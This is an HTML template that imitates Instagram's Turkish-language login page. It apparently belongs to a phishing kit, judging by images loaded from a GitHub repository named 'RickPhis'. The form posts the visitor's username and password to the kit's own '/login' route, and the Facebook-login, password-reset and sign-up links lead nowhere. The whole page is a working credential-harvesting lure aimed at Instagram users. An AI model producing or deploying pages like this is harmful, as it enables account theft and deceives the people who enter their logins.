<!DOCTYPE html>
<html lang="tr" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
    </style>
</head>
<body class="bg-black text-zinc-100 antialiased">

    <main class="flex flex-col items-center justify-center min-h-screen w-full px-4">
        
        <div class="flex-grow flex items-center justify-center w-full">
            <div class="flex items-center justify-center w-full max-w-4xl gap-x-16">
                
                <div class="hidden lg:block">
                    <img src="https://raw.githubusercontent.com/Rickidevs/RickPhis/refs/heads/Main/static/pcimage.png" alt="Telefon Ekran Görüntüsü" class="h-[580px] w-auto">
                </div>

                <div class="w-full max-w-sm mx-auto">
                    <div class="flex flex-col items-center">
                        <div class="w-full flex justify-center my-10">
                            <img src="https://raw.githubusercontent.com/Rickidevs/RickPhis/refs/heads/Main/static/instagram.png" alt="Instagram" class="w-[175px] h-auto invert">
                        </div>

                        <form method="POST" action="/login" id="loginForm" class="flex flex-col gap-3 w-full">
                            <input id="username" name="username" type="text" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="w-full px-4 py-2.5 bg-zinc-900 border border-zinc-700 rounded-lg text-sm placeholder-zinc-500 focus:outline-none focus:border-zinc-400 transition-colors" required>

                            <div class="relative">
                                 <input id="password" name="password" type="password" placeholder="Şifre" class="w-full px-4 py-2.5 bg-zinc-900 border border-zinc-700 rounded-lg text-sm placeholder-zinc-500 focus:outline-none focus:border-zinc-400 transition-colors" required>
                                 <button type="button" id="togglePassword" class="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-semibold text-white hidden">Göster</button>
                            </div>

                            <button type="submit" id="loginButton" class="w-full bg-indigo-600 hover:bg-indigo-700 transition-colors text-white rounded-lg py-2.5 mt-2 text-sm font-semibold">
                                Giriş Yap
                            </button>
                        </form>

                        {% if error %}
                            <p class="text-red-500 text-sm mt-4 text-center">{{ error }}</p>
                        {% endif %}

                        <div class="flex items-center my-6 w-full">
                            <div class="flex-grow border-t border-zinc-700"></div>
                            <span class="px-4 text-xs font-semibold text-zinc-500 uppercase">Veya</span>
                            <div class="flex-grow border-t border-zinc-700"></div>
                        </div>

                        <a href="#" class="flex items-center justify-center gap-2 text-sm font-semibold text-sky-400 mb-4">
                            <svg class="w-5 h-5" fill="#3897f0" viewBox="0 0 24 24">
                               <path d="M22.675 0h-21.35C.59 0 0 .59 0 1.325v21.35C0 23.41.59 24 1.325 24H12.82v-9.29H9.692v-3.622h3.128V8.413c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12V24h6.116c.735 0 1.325-.59 1.325-1.325V1.325C24 .59 23.41 0 22.675 0z"/>
                            </svg>
                            Facebook ile Giriş Yap
                        </a>

                        <a href="#" class="block text-center text-xs text-sky-400 mt-2">Şifreni mi unuttun?</a>
                        
                        <div class="text-center py-5 px-6 mt-6 w-full border border-zinc-700 rounded-lg">
                            <p class="text-sm">
                                Hesabın yok mu? 
                                <a href="#" class="font-semibold text-sky-400 hover:text-sky-500 transition-colors">Kaydol</a>
                            </p>
                        </div>
                    </div>
                </div>

            </div>
        </div>

        <footer class="text-xs text-zinc-500 w-full py-8">
            <div class="flex flex-wrap justify-center items-center gap-x-4 gap-y-2 mb-4">
                <a href="#" class="hover:underline">Meta</a>
                <a href="#" class="hover:underline">Hakkında</a>
                <a href="#" class="hover:underline">Blog</a>
                <a href="#" class="hover:underline">İş Fırsatları</a>
                <a href="#" class="hover:underline">Yardım</a>
                <a href="#" class="hover:underline">API</a>
                <a href="#" class="hover:underline">Gizlilik</a>
                <a href="#" class="hover:underline">Koşullar</a>
                <a href="#" class="hover:underline">Konumlar</a>
                <a href="#" class="hover:underline">Instagram Lite</a>
                <a href="#" class="hover:underline">Threads</a>
                <a href="#" class="hover:underline">Meta Verified</a>
            </div>
            <div class="text-center">
                <span>© 2025 Instagram from Meta</span>
            </div>
        </footer>
    </main>
</body>
  </html>
